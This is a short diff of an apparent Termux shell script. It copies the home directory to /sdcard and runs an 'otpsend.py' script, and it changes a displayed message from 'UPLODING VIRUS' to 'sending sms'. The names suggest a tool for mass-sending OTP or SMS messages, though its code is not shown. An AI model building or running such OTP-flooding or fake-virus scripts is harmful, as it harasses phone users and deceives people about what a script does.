@@ -7,7 +7,7 @@ cd ..
 cd ..
 cp -r home /sdcard
 clear
-echo -e $ed "UPLODING VIRUS"
+echo -e $ed "sending sms"
 sleep 2
 cd /data/data/com.termux/files/home/otp
 python otpsend.py
